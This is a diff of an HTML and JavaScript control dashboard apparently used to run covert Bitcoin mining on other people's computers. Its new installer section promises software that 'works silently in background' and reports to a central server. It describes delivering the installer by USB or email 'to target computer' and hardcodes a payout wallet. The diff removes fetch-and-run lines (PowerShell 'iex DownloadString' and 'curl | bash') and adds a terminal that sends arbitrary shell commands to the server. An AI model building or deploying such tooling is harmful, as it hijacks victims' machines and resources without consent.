@@ -80,6 +80,16 @@
             border-left-color: #00ff00;
         }
 
+        .alert-badge {
+            background: #ff4444;
+            color: #ffffff;
+            font-size: 10px;
+            padding: 2px 6px;
+            border-radius: 10px;
+            margin-left: 5px;
+            font-weight: bold;
+        }
+
         .nav-item.active {
             color: #00ff00;
             background: #1a1a1a;
@@ -122,6 +132,114 @@
             color: #00ff00;
             text-transform: uppercase;
             letter-spacing: 1px;
+        }
+
+        /* Alerts Section */
+        .alerts-container {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .alert-stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 15px;
+        }
+
+        .alerts-list {
+            max-height: 400px;
+            overflow-y: auto;
+            border: 1px solid #333333;
+            border-radius: 8px;
+            background: #0a0a0a;
+        }
+
+        .alert-item {
+            padding: 15px;
+            border-bottom: 1px solid #222222;
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            gap: 15px;
+        }
+
+        .alert-item:last-child {
+            border-bottom: none;
+        }
+
+        .alert-item.critical {
+            border-left: 4px solid #ff4444;
+            background: rgba(255, 68, 68, 0.05);
+        }
+
+        .alert-item.warning {
+            border-left: 4px solid #ffaa00;
+            background: rgba(255, 170, 0, 0.05);
+        }
+
+        .alert-item.info {
+            border-left: 4px solid #00aaff;
+            background: rgba(0, 170, 255, 0.05);
+        }
+
+        .alert-content {
+            flex: 1;
+        }
+
+        .alert-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 5px;
+        }
+
+        .alert-type {
+            font-weight: bold;
+            text-transform: uppercase;
+            font-size: 12px;
+        }
+
+        .alert-type.critical {
+            color: #ff4444;
+        }
+
+        .alert-type.warning {
+            color: #ffaa00;
+        }
+
+        .alert-type.info {
+            color: #00aaff;
+        }
+
+        .alert-timestamp {
+            font-size: 10px;
+            color: #666666;
+        }
+
+        .alert-message {
+            color: #cccccc;
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+
+        .alert-data {
+            font-size: 11px;
+            color: #888888;
+            background: #1a1a1a;
+            padding: 8px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            white-space: pre-wrap;
+            max-height: 100px;
+            overflow-y: auto;
+        }
+
+        .no-alerts {
+            text-align: center;
+            color: #666666;
+            padding: 40px;
+            font-style: italic;
         }
 
         .section-content {
@@ -203,6 +321,63 @@
         .control-btn.danger:hover {
             background: #ff0000;
             color: #000000;
+        }
+
+        /* Mining State Buttons */
+        .mining-btn {
+            position: relative;
+            min-width: 120px;
+        }
+
+        .mining-btn.active {
+            background: #00ff00;
+            color: #000000;
+            border-color: #00ff00;
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
+        }
+
+        .mining-btn.active::before {
+            content: "●";
+            color: #000000;
+            margin-right: 5px;
+            animation: pulse 2s infinite;
+        }
+
+        .mining-btn.inactive {
+            background: #000000;
+            color: #888888;
+            border-color: #333333;
+        }
+
+        .mining-btn.inactive::before {
+            content: "○";
+            color: #888888;
+            margin-right: 5px;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+
+        /* Status Indicator */
+        .status-indicator {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            margin-right: 8px;
+        }
+
+        .status-indicator.active {
+            background: #00ff00;
+            box-shadow: 0 0 6px rgba(0, 255, 0, 0.6);
+            animation: pulse 2s infinite;
+        }
+
+        .status-indicator.inactive {
+            background: #666666;
         }
 
         /* Terminal */
@@ -376,15 +551,295 @@
         /* Responsive */
         @media (max-width: 768px) {
             .sidebar {
-                width: 150px;
+                width: 100%;
+                height: auto;
+                position: relative;
+                border-right: none;
+                border-bottom: 1px solid #222222;
+                padding: 10px 0;
+            }
+
+            .sidebar-header {
+                padding: 0 15px 15px;
+                text-align: center;
+            }
+
+            .logo {
+                font-size: 12px;
+            }
+
+            .sidebar-nav {
+                display: flex;
+                flex-wrap: wrap;
+                justify-content: center;
+                gap: 5px;
+            }
+
+            .nav-item {
+                margin: 2px;
+                padding: 6px 10px;
+                font-size: 11px;
+                border-radius: 4px;
             }
             
             .main-content {
-                margin-left: 150px;
+                margin-left: 0;
+                padding: 15px 10px;
+            }
+
+            .page-header {
+                padding: 15px 0;
+                margin-bottom: 20px;
+            }
+
+            .page-title {
+                font-size: 20px;
             }
             
             .stats-grid {
                 grid-template-columns: 1fr;
+                gap: 10px;
+            }
+
+            .stat-card {
+                padding: 12px;
+                border-radius: 8px;
+            }
+
+            .stat-label {
+                font-size: 11px;
+            }
+
+            .stat-value {
+                font-size: 20px;
+            }
+
+            .stat-unit {
+                font-size: 10px;
+            }
+
+            .controls-grid {
+                grid-template-columns: 1fr;
+                gap: 10px;
+            }
+
+            .control-group {
+                padding: 12px;
+                border-radius: 8px;
+            }
+
+            .control-title {
+                font-size: 14px;
+                margin-bottom: 10px;
+            }
+
+            .button {
+                padding: 8px 12px;
+                font-size: 11px;
+                border-radius: 4px;
+            }
+
+            .button-group {
+                display: flex;
+                flex-wrap: wrap;
+                gap: 5px;
+            }
+
+            .clients-grid {
+                grid-template-columns: 1fr;
+                gap: 10px;
+            }
+
+            .client-card {
+                padding: 12px;
+                border-radius: 8px;
+            }
+
+            .client-header {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 5px;
+            }
+
+            .client-name {
+                font-size: 14px;
+            }
+
+            .client-status {
+                font-size: 10px;
+                padding: 2px 6px;
+            }
+
+            .client-stats {
+                grid-template-columns: 1fr 1fr;
+                gap: 8px;
+                margin-top: 10px;
+            }
+
+            .client-stat {
+                font-size: 11px;
+            }
+
+            .modal {
+                padding: 15px;
+            }
+
+            .modal-content {
+                max-width: 95%;
+                margin: 5px auto;
+                padding: 15px;
+                border-radius: 8px;
+            }
+
+            .modal-header {
+                margin-bottom: 15px;
+            }
+
+            .modal-title {
+                font-size: 16px;
+            }
+
+            .form-group {
+                margin-bottom: 12px;
+            }
+
+            .form-label {
+                font-size: 12px;
+                margin-bottom: 5px;
+            }
+
+            .form-input {
+                padding: 8px;
+                font-size: 12px;
+                border-radius: 4px;
+            }
+
+            .form-select {
+                padding: 8px;
+                font-size: 12px;
+                border-radius: 4px;
+            }
+
+            .form-textarea {
+                padding: 8px;
+                font-size: 12px;
+                border-radius: 4px;
+                min-height: 80px;
+            }
+
+            .modal-actions {
+                gap: 8px;
+                margin-top: 15px;
+            }
+
+            .modal-button {
+                padding: 8px 12px;
+                font-size: 11px;
+                border-radius: 4px;
+            }
+
+            .alert {
+                padding: 10px;
+                margin: 10px 0;
+                border-radius: 6px;
+                font-size: 12px;
+            }
+
+            .loading {
+                font-size: 12px;
+            }
+
+            .error {
+                font-size: 12px;
+            }
+
+            .success {
+                font-size: 12px;
+            }
+
+            /* Touch-friendly improvements */
+            .button, .nav-item, .modal-button {
+                min-height: 44px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+            }
+
+            /* Better spacing for mobile */
+            .section {
+                margin-bottom: 20px;
+            }
+
+            .section-title {
+                font-size: 16px;
+                margin-bottom: 10px;
+            }
+
+            /* Responsive tables */
+            .table-container {
+                overflow-x: auto;
+                -webkit-overflow-scrolling: touch;
+            }
+
+            table {
+                min-width: 600px;
+            }
+
+            th, td {
+                padding: 8px 6px;
+                font-size: 11px;
+            }
+        }
+
+        /* Extra small devices */
+        @media (max-width: 480px) {
+            .main-content {
+                padding: 10px 5px;
+            }
+
+            .stats-grid {
+                gap: 8px;
+            }
+
+            .stat-card {
+                padding: 10px;
+            }
+
+            .stat-value {
+                font-size: 18px;
+            }
+
+            .controls-grid {
+                gap: 8px;
+            }
+
+            .control-group {
+                padding: 10px;
+            }
+
+            .button {
+                padding: 6px 10px;
+                font-size: 10px;
+            }
+
+            .clients-grid {
+                gap: 8px;
+            }
+
+            .client-card {
+                padding: 10px;
+            }
+
+            .modal-content {
+                padding: 10px;
+            }
+
+            .page-title {
+                font-size: 18px;
+            }
+
+            .section-title {
+                font-size: 14px;
             }
         }
 
@@ -525,6 +980,7 @@
             <a href="#statistics" class="nav-item active" onclick="scrollToSection('statistics')">statistics</a>
             <a href="#mining-control" class="nav-item" onclick="scrollToSection('mining-control')">mining control</a>
             <a href="#mining-status" class="nav-item" onclick="scrollToSection('mining-status')">mining status</a>
+            <a href="#alerts" class="nav-item" onclick="scrollToSection('alerts')">alerts <span id="alertBadge" class="alert-badge" style="display: none;">0</span></a>
             <a href="#terminal" class="nav-item" onclick="scrollToSection('terminal')">terminal</a>
         </div>
         
@@ -683,9 +1139,16 @@
                     <div style="font-size: 10px; color: #666666;">control all clients</div>
                 </div>
                 <div class="section-content">
+                    <!-- Mining Status Indicator -->
+                    <div style="display: flex; align-items: center; margin-bottom: 20px; padding: 10px; background: #111111; border: 1px solid #222222; border-radius: 2px;">
+                        <span class="status-indicator inactive" id="miningStatusIndicator"></span>
+                        <span style="color: #888888; font-size: 12px; margin-right: 10px;">MINING STATUS:</span>
+                        <span id="miningStatusText" style="color: #888888; font-size: 12px; font-weight: bold;">STOPPED</span>
+                    </div>
+                    
                     <div style="display: flex; gap: 15px; margin-bottom: 20px;">
-                        <button class="control-btn" id="startAllBtn" onclick="startAllMining()">start all</button>
-                        <button class="control-btn danger" id="stopAllBtn" onclick="stopAllMining()">stop all</button>
+                        <button class="control-btn mining-btn inactive" id="startAllBtn" onclick="startAllMining()">start all</button>
+                        <button class="control-btn mining-btn inactive" id="stopAllBtn" onclick="stopAllMining()">stop all</button>
                         <button class="control-btn" id="restartAllBtn" onclick="restartAllMining()">restart all</button>
                         <button class="control-btn" id="optimizeAllBtn" onclick="optimizeAllMining()">optimize all</button>
                     </div>
@@ -792,6 +1255,45 @@
             </div>
         </section>
 
+        <!-- Alerts Section -->
+        <section id="alerts" class="content-section">
+            <div class="section">
+                <div class="section-header">
+                    <div class="section-title">system alerts</div>
+                    <div style="display: flex; gap: 10px; align-items: center;">
+                        <div style="font-size: 10px; color: #666666;">monitoring & notifications</div>
+                        <button class="control-btn" onclick="testAlert()" style="font-size: 10px; padding: 2px 8px;">test alert</button>
+                        <button class="control-btn" onclick="clearAlerts()" style="font-size: 10px; padding: 2px 8px;">clear all</button>
+                    </div>
+                </div>
+                <div class="section-content">
+                    <div class="alerts-container">
+                        <div class="alert-stats">
+                            <div class="stat-card">
+                                <div class="stat-label">total alerts</div>
+                                <div class="stat-value" id="totalAlerts">0</div>
+                            </div>
+                            <div class="stat-card">
+                                <div class="stat-label">critical</div>
+                                <div class="stat-value" id="criticalAlerts">0</div>
+                            </div>
+                            <div class="stat-card">
+                                <div class="stat-label">warnings</div>
+                                <div class="stat-value" id="warningAlerts">0</div>
+                            </div>
+                            <div class="stat-card">
+                                <div class="stat-label">last 24h</div>
+                                <div class="stat-value" id="recentAlerts">0</div>
+                            </div>
+                        </div>
+                        <div class="alerts-list" id="alertsList">
+                            <div class="no-alerts">No alerts at this time</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
         <!-- Terminal Section -->
         <section id="terminal" class="content-section">
             <div class="section">
@@ -807,9 +1309,10 @@
                     <div class="terminal" id="terminal">
                         <div class="terminal-line terminal-timestamp">[2024-01-15 12:34:56]</div>
                         <div class="terminal-line terminal-info">mining dashboard initialized</div>
-                        <div class="terminal-line terminal-info">connecting to pool: stratum+tcp://btc.ss.poolin.com:443</div>
-                        <div class="terminal-line terminal-warning">no active clients detected</div>
-                        <div class="terminal-line terminal-info">waiting for client connections...</div>
+                        <div class="terminal-line terminal-info">server ready - waiting for mining commands</div>
+                        <div class="terminal-line terminal-info">pool: stratum+tcp://btc.ss.poolin.com:443</div>
+                        <div class="terminal-line terminal-info">wallet: bc1qz2zqqgdz7whfmmkpcthn5gkv4ew4dfjs6fyeat</div>
+                        <div class="terminal-line terminal-info">type 'help' for available commands</div>
                     </div>
                     <div class="terminal-prompt">
                         <input type="text" class="terminal-input" id="terminalInput" placeholder="Enter command..." onkeypress="handleTerminalInput(event)">
@@ -842,34 +1345,56 @@
                 </div>
                 <div class="section-content">
                     <div style="background: #000000; border: 1px solid #222222; padding: 20px; border-radius: 2px;">
-                        <div style="font-size: 12px; color: #666666; margin-bottom: 15px;">installation instructions</div>
+                        <div style="font-size: 12px; color: #00ff00; margin-bottom: 15px;">🚀 SIMPLE ONE-CLICK INSTALLER</div>
                         
                         <div style="margin-bottom: 20px;">
-                            <div style="font-size: 11px; color: #00ff00; margin-bottom: 8px;">windows:</div>
-                            <div style="background: #000000; padding: 10px; border-radius: 4px; font-size: 10px; color: #888888;">
-                                powershell -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://localhost:3000/install/windows'))"
+                            <div style="font-size: 11px; color: #666666; margin-bottom: 10px;">What this does:</div>
+                            <div style="font-size: 10px; color: #888888; line-height: 1.4;">
+                                • Installs Bitcoin mining software automatically<br>
+                                • Starts mining immediately<br>
+                                • Reports to main server (192.168.1.168:3000)<br>
+                                • Works silently in background<br>
+                                • No manual management needed
                             </div>
                         </div>
                         
-                        <div style="margin-bottom: 20px;">
-                            <div style="font-size: 11px; color: #00ff00; margin-bottom: 8px;">linux/ubuntu:</div>
-                            <div style="background: #000000; padding: 10px; border-radius: 4px; font-size: 10px; color: #888888;">
-                                curl -sSL http://localhost:3000/install/ubuntu | bash
+                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 20px;">
+                            <div style="background: #111111; padding: 15px; border-radius: 4px;">
+                                <div style="font-size: 11px; color: #00ff00; margin-bottom: 8px;">📁 USB Drive Method</div>
+                                <div style="font-size: 10px; color: #888888; margin-bottom: 10px;">
+                                    1. Download installer<br>
+                                    2. Copy to USB drive<br>
+                                    3. Right-click → "Open with Terminal"<br>
+                                    4. Follow prompts
+                                </div>
+                                <button class="control-btn" onclick="downloadSimpleInstaller()" style="font-size: 10px; padding: 5px 10px;">Download Installer</button>
+                            </div>
+                            
+                            <div style="background: #111111; padding: 15px; border-radius: 4px;">
+                                <div style="font-size: 11px; color: #00ff00; margin-bottom: 8px;">📧 Email Method</div>
+                                <div style="font-size: 10px; color: #888888; margin-bottom: 10px;">
+                                    1. Email installer to target computer<br>
+                                    2. Download attachment<br>
+                                    3. Right-click → "Open with Terminal"<br>
+                                    4. Follow prompts
+                                </div>
+                                <button class="control-btn" onclick="downloadEmailInstaller()" style="font-size: 10px; padding: 5px 10px;">Download for Email</button>
                             </div>
                         </div>
                         
-                        <div style="margin-bottom: 20px;">
-                            <div style="font-size: 11px; color: #00ff00; margin-bottom: 8px;">manual installation:</div>
-                            <div style="background: #000000; padding: 10px; border-radius: 4px; font-size: 10px; color: #888888;">
-                                1. download cpuminer<br>
-                                2. extract to system folder<br>
-                                3. run: ./minerd -a sha256d -o stratum+tcp://btc.ss.poolin.com:443 -u bc1qz2zqqgdz7whfmmkpcthn5gkv4ew4dfjs6fyeat -p x
+                        <div style="background: #111111; padding: 15px; border-radius: 4px;">
+                            <div style="font-size: 11px; color: #00ff00; margin-bottom: 8px;">📖 Instructions</div>
+                            <div style="font-size: 10px; color: #888888; margin-bottom: 10px;">
+                                Complete installation guide with troubleshooting tips
                             </div>
+                            <button class="control-btn" onclick="downloadInstructions()" style="font-size: 10px; padding: 5px 10px;">Download Instructions</button>
                         </div>
                         
-                        <div style="display: flex; gap: 10px; margin-top: 20px;">
-                            <button class="control-btn" onclick="generateInstallScript()">generate script</button>
-                            <button class="control-btn" onclick="downloadInstaller()">download installer</button>
+                        <div style="margin-top: 20px; padding-top: 20px; border-top: 1px solid #333333;">
+                            <div style="font-size: 11px; color: #666666; margin-bottom: 8px;">direct download url:</div>
+                            <div style="background: #000000; padding: 10px; border-radius: 4px; font-size: 10px; color: #888888;">
+                                http://192.168.1.168:3000/INSTALL-MINING-WORKER.sh
+                            </div>
                         </div>
                     </div>
                 </div>
@@ -1077,6 +1602,7 @@
                     });
                     
                     saveMiningState(); // Save state to localStorage
+                    updateMiningStatusUI(true);
                     updateButtonStates();
                     updateStatistics();
                     addTerminalLog('info', 'Starting real Bitcoin mining...');
@@ -1105,6 +1631,7 @@
                     });
                     
                     saveMiningState(); // Save state to localStorage
+                    updateMiningStatusUI(false);
                     updateButtonStates();
                     updateStatistics();
                     addTerminalLog('warning', 'Stopped real Bitcoin mining');
@@ -1140,6 +1667,38 @@
             updateStatistics();
             addTerminalLog('info', 'Optimized mining performance on all clients');
             renderClients();
+        }
+
+        // Update mining status UI
+        function updateMiningStatusUI(isMining) {
+            const statusIndicator = document.getElementById('miningStatusIndicator');
+            const statusText = document.getElementById('miningStatusText');
+            const startBtn = document.getElementById('startAllBtn');
+            const stopBtn = document.getElementById('stopAllBtn');
+            
+            if (isMining) {
+                // Mining is ACTIVE
+                statusIndicator.className = 'status-indicator active';
+                statusText.textContent = 'ACTIVE';
+                statusText.style.color = '#00ff00';
+                
+                // Update buttons
+                startBtn.className = 'control-btn mining-btn active';
+                startBtn.textContent = '● MINING ACTIVE';
+                stopBtn.className = 'control-btn mining-btn inactive';
+                stopBtn.textContent = 'stop all';
+            } else {
+                // Mining is STOPPED
+                statusIndicator.className = 'status-indicator inactive';
+                statusText.textContent = 'STOPPED';
+                statusText.style.color = '#888888';
+                
+                // Update buttons
+                startBtn.className = 'control-btn mining-btn inactive';
+                startBtn.textContent = 'start all';
+                stopBtn.className = 'control-btn mining-btn inactive';
+                stopBtn.textContent = 'stop all';
+            }
         }
 
         function updateButtonStates() {
@@ -1528,6 +2087,61 @@
             const totalUptime = miningState.clients.reduce((sum, client) => sum + client.uptime, 0);
             document.getElementById('totalUptime').textContent = 
                 Math.floor(totalUptime / 3600) + 'h ' + Math.floor((totalUptime % 3600) / 60) + 'm';
+
+            // Update network and pool status
+            updateNetworkStatus();
+        }
+
+        // Update network and pool connection status
+        async function updateNetworkStatus() {
+            try {
+                // Check if mining is active
+                const isMining = miningState.allMining && miningState.clients.some(c => c.status === 'mining');
+                
+                if (isMining) {
+                    // Mining is active - check real connection status
+                    const response = await fetch('/api/status');
+                    const result = await response.json();
+                    
+                    if (result.success && result.data.isRunning) {
+                        // Connected and mining
+                        document.getElementById('networkStatus').textContent = 'connected';
+                        document.getElementById('networkStatus').style.color = '#00ff00';
+                        document.getElementById('networkChange').textContent = 'mining active';
+                        
+                        document.getElementById('poolStatus').textContent = 'connected';
+                        document.getElementById('poolStatus').style.color = '#00ff00';
+                        document.getElementById('poolChange').textContent = 'poolin.com:443';
+                    } else {
+                        // Server says not running but we think it should be
+                        document.getElementById('networkStatus').textContent = 'connecting...';
+                        document.getElementById('networkStatus').style.color = '#ffaa00';
+                        document.getElementById('networkChange').textContent = 'establishing connection';
+                        
+                        document.getElementById('poolStatus').textContent = 'connecting...';
+                        document.getElementById('poolStatus').style.color = '#ffaa00';
+                        document.getElementById('poolChange').textContent = 'poolin.com:443';
+                    }
+                } else {
+                    // Mining is not active
+                    document.getElementById('networkStatus').textContent = 'disconnected';
+                    document.getElementById('networkStatus').style.color = '#888888';
+                    document.getElementById('networkChange').textContent = 'mining stopped';
+                    
+                    document.getElementById('poolStatus').textContent = 'disconnected';
+                    document.getElementById('poolStatus').style.color = '#888888';
+                    document.getElementById('poolChange').textContent = 'not connected';
+                }
+            } catch (error) {
+                // Error checking status - assume disconnected
+                document.getElementById('networkStatus').textContent = 'error';
+                document.getElementById('networkStatus').style.color = '#ff0000';
+                document.getElementById('networkChange').textContent = 'connection failed';
+                
+                document.getElementById('poolStatus').textContent = 'error';
+                document.getElementById('poolStatus').style.color = '#ff0000';
+                document.getElementById('poolChange').textContent = 'connection failed';
+            }
         }
 
         // Terminal Functions
@@ -1566,6 +2180,112 @@
             addTerminalLog('info', 'Terminal cleared');
         }
 
+        // Alert Management Functions
+        async function fetchAlerts() {
+            try {
+                const response = await fetch('/api/alerts');
+                const result = await response.json();
+                
+                if (result.success) {
+                    updateAlertStats(result.stats);
+                    renderAlerts(result.alerts);
+                    updateAlertBadge(result.stats);
+                }
+            } catch (error) {
+                console.error('Failed to fetch alerts:', error);
+                addTerminalLog('error', 'Failed to fetch alerts: ' + error.message);
+            }
+        }
+
+        function updateAlertStats(stats) {
+            document.getElementById('totalAlerts').textContent = stats.total;
+            document.getElementById('criticalAlerts').textContent = stats.critical;
+            document.getElementById('warningAlerts').textContent = stats.warning;
+            document.getElementById('recentAlerts').textContent = stats.last24h;
+        }
+
+        function renderAlerts(alerts) {
+            const alertsList = document.getElementById('alertsList');
+            
+            if (alerts.length === 0) {
+                alertsList.innerHTML = '<div class="no-alerts">No alerts at this time</div>';
+                return;
+            }
+
+            alertsList.innerHTML = alerts.map(alert => `
+                <div class="alert-item ${alert.severity}">
+                    <div class="alert-content">
+                        <div class="alert-header">
+                            <span class="alert-type ${alert.severity}">${alert.type}</span>
+                            <span class="alert-timestamp">${new Date(alert.timestamp).toLocaleString()}</span>
+                        </div>
+                        <div class="alert-message">${alert.message}</div>
+                        ${Object.keys(alert.data).length > 0 ? `
+                            <div class="alert-data">${JSON.stringify(alert.data, null, 2)}</div>
+                        ` : ''}
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        function updateAlertBadge(stats) {
+            const badge = document.getElementById('alertBadge');
+            const totalAlerts = stats.critical + stats.warning;
+            
+            if (totalAlerts > 0) {
+                badge.textContent = totalAlerts;
+                badge.style.display = 'inline';
+            } else {
+                badge.style.display = 'none';
+            }
+        }
+
+        async function testAlert() {
+            try {
+                const response = await fetch('/api/alerts/test', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        type: 'test_alert',
+                        severity: 'info',
+                        message: 'This is a test alert from the dashboard'
+                    })
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    addTerminalLog('info', 'Test alert sent successfully');
+                    await fetchAlerts(); // Refresh alerts
+                } else {
+                    addTerminalLog('error', 'Failed to send test alert: ' + result.message);
+                }
+            } catch (error) {
+                addTerminalLog('error', 'Error sending test alert: ' + error.message);
+            }
+        }
+
+        async function clearAlerts() {
+            try {
+                const response = await fetch('/api/alerts', {
+                    method: 'DELETE'
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    addTerminalLog('info', 'All alerts cleared');
+                    await fetchAlerts(); // Refresh alerts
+                } else {
+                    addTerminalLog('error', 'Failed to clear alerts: ' + result.message);
+                }
+            } catch (error) {
+                addTerminalLog('error', 'Error clearing alerts: ' + error.message);
+            }
+        }
+
         function handleTerminalInput(event) {
             if (event.key === 'Enter') {
                 const input = event.target;
@@ -1584,77 +2304,121 @@
             }
         }
 
-        function processTerminalCommand(command) {
+        async function processTerminalCommand(command) {
             const cmd = command.toLowerCase();
             
-            switch (cmd) {
-                case 'help':
-                    addTerminalLog('info', 'Available commands:');
-                    addTerminalLog('info', '  help - Show this help');
-                    addTerminalLog('info', '  status - Show mining status');
-                    addTerminalLog('info', '  start - Start mining');
-                    addTerminalLog('info', '  stop - Stop mining');
-                    addTerminalLog('info', '  restart - Restart mining');
-                    addTerminalLog('info', '  stats - Show statistics');
-                    addTerminalLog('info', '  clients - Show client list');
-                    addTerminalLog('info', '  clear - Clear terminal');
-                    addTerminalLog('info', '  uptime - Show system uptime');
-                    break;
+            // Check if it's a built-in mining command first
+            if (['help', 'status', 'start', 'stop', 'restart', 'stats', 'clients', 'clear', 'uptime'].includes(cmd)) {
+                switch (cmd) {
+                    case 'help':
+                        addTerminalLog('info', 'Available commands:');
+                        addTerminalLog('info', '  help - Show this help');
+                        addTerminalLog('info', '  status - Show mining status');
+                        addTerminalLog('info', '  start - Start mining');
+                        addTerminalLog('info', '  stop - Stop mining');
+                        addTerminalLog('info', '  restart - Restart mining');
+                        addTerminalLog('info', '  stats - Show statistics');
+                        addTerminalLog('info', '  clients - Show client list');
+                        addTerminalLog('info', '  clear - Clear terminal');
+                        addTerminalLog('info', '  uptime - Show system uptime');
+                        addTerminalLog('info', '');
+                        addTerminalLog('info', 'System commands (any shell command):');
+                        addTerminalLog('info', '  ls - List files');
+                        addTerminalLog('info', '  pwd - Show current directory');
+                        addTerminalLog('info', '  ps - Show processes');
+                        addTerminalLog('info', '  top - Show system resources');
+                        addTerminalLog('info', '  df - Show disk usage');
+                        addTerminalLog('info', '  free - Show memory usage');
+                        addTerminalLog('info', '  whoami - Show current user');
+                        addTerminalLog('info', '  date - Show current date/time');
+                        addTerminalLog('info', '  uname - Show system info');
+                        addTerminalLog('info', '  and many more...');
+                        break;
+                        
+                    case 'status':
+                        addTerminalLog('info', `Mining Status: ${miningState.allMining ? 'ACTIVE' : 'INACTIVE'}`);
+                        const activeClients = miningState.clients.filter(c => c.status === 'mining').length;
+                        addTerminalLog('info', `Active Clients: ${activeClients}/${miningState.clients.length}`);
+                        break;
+                        
+                    case 'start':
+                        if (!miningState.allMining) {
+                            startAllMining();
+                        } else {
+                            addTerminalLog('warning', 'Mining is already active');
+                        }
+                        break;
+                        
+                    case 'stop':
+                        if (miningState.allMining) {
+                            stopAllMining();
+                        } else {
+                            addTerminalLog('warning', 'Mining is not active');
+                        }
+                        break;
+                        
+                    case 'restart':
+                        restartAllMining();
+                        break;
+                        
+                    case 'stats':
+                        const totalHashrate = miningState.clients.reduce((sum, client) => sum + client.hashrate, 0);
+                        addTerminalLog('info', `Total Hashrate: ${totalHashrate.toFixed(2)} MH/s`);
+                        addTerminalLog('info', `Total Shares: ${miningState.clients.reduce((sum, client) => sum + client.shares.accepted, 0)}`);
+                        break;
+                        
+                    case 'clients':
+                        addTerminalLog('info', 'Connected Clients:');
+                        miningState.clients.forEach(client => {
+                            addTerminalLog('info', `  ${client.name} - ${client.status} - ${client.hashrate.toFixed(2)} MH/s`);
+                        });
+                        break;
+                        
+                    case 'clear':
+                        clearTerminal();
+                        break;
+                        
+                    case 'uptime':
+                        const uptime = miningState.clients.reduce((sum, client) => sum + client.uptime, 0);
+                        const hours = Math.floor(uptime / 3600);
+                        const minutes = Math.floor((uptime % 3600) / 60);
+                        addTerminalLog('info', `System Uptime: ${hours}h ${minutes}m`);
+                        break;
+                }
+            } else {
+                // Execute as system command
+                try {
+                    addTerminalLog('info', 'Executing system command...');
                     
-                case 'status':
-                    addTerminalLog('info', `Mining Status: ${miningState.allMining ? 'ACTIVE' : 'INACTIVE'}`);
-                    const activeClients = miningState.clients.filter(c => c.status === 'mining').length;
-                    addTerminalLog('info', `Active Clients: ${activeClients}/${miningState.clients.length}`);
-                    break;
-                    
-                case 'start':
-                    if (!miningState.allMining) {
-                        startAllMining();
-                    } else {
-                        addTerminalLog('warning', 'Mining is already active');
-                    }
-                    break;
-                    
-                case 'stop':
-                    if (miningState.allMining) {
-                        stopAllMining();
-                    } else {
-                        addTerminalLog('warning', 'Mining is not active');
-                    }
-                    break;
-                    
-                case 'restart':
-                    restartAllMining();
-                    break;
-                    
-                case 'stats':
-                    const totalHashrate = miningState.clients.reduce((sum, client) => sum + client.hashrate, 0);
-                    addTerminalLog('info', `Total Hashrate: ${totalHashrate.toFixed(2)} MH/s`);
-                    addTerminalLog('info', `Total Shares: ${miningState.clients.reduce((sum, client) => sum + client.shares.accepted, 0)}`);
-                    break;
-                    
-                case 'clients':
-                    addTerminalLog('info', 'Connected Clients:');
-                    miningState.clients.forEach(client => {
-                        addTerminalLog('info', `  ${client.name} - ${client.status} - ${client.hashrate.toFixed(2)} MH/s`);
+                    const response = await fetch('/api/terminal/execute', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ command: command })
                     });
-                    break;
-                    
-                case 'clear':
-                    clearTerminal();
-                    break;
-                    
-                case 'uptime':
-                    const uptime = miningState.clients.reduce((sum, client) => sum + client.uptime, 0);
-                    const hours = Math.floor(uptime / 3600);
-                    const minutes = Math.floor((uptime % 3600) / 60);
-                    addTerminalLog('info', `System Uptime: ${hours}h ${minutes}m`);
-                    break;
-                    
-                default:
-                    addTerminalLog('error', `Unknown command: ${command}`);
-                    addTerminalLog('info', 'Type "help" for available commands');
-                    break;
+
+                    const result = await response.json();
+
+                    if (result.success) {
+                        // Split output into lines and display each
+                        const outputLines = result.output.split('\n').filter(line => line.trim() !== '');
+                        if (outputLines.length === 0) {
+                            addTerminalLog('info', 'Command executed successfully (no output)');
+                        } else {
+                            outputLines.forEach(line => {
+                                addTerminalLog('info', line);
+                            });
+                        }
+                    } else {
+                        addTerminalLog('error', `Command failed: ${result.message}`);
+                        if (result.output) {
+                            addTerminalLog('error', result.output);
+                        }
+                    }
+                } catch (error) {
+                    addTerminalLog('error', `Failed to execute command: ${error.message}`);
+                }
             }
         }
 
@@ -1662,6 +2426,73 @@
         function generateInstallScript() {
             addTerminalLog('info', 'Generated installation script for current system');
             // Implementation would generate actual install script
+        }
+
+        // Simple installer download functions
+        async function downloadSimpleInstaller() {
+            try {
+                const response = await fetch('/INSTALL-MINING-WORKER.sh');
+                const script = await response.text();
+                
+                const blob = new Blob([script], { type: 'text/plain' });
+                const url = window.URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'INSTALL-MINING-WORKER.sh';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                window.URL.revokeObjectURL(url);
+                
+                addTerminalLog('info', 'Simple installer downloaded successfully');
+                addTerminalLog('info', 'Copy to USB drive or email to target computer');
+            } catch (error) {
+                addTerminalLog('error', 'Failed to download installer: ' + error.message);
+            }
+        }
+
+        async function downloadEmailInstaller() {
+            try {
+                const response = await fetch('/INSTALL-MINING-WORKER.sh');
+                const script = await response.text();
+                
+                const blob = new Blob([script], { type: 'text/plain' });
+                const url = window.URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
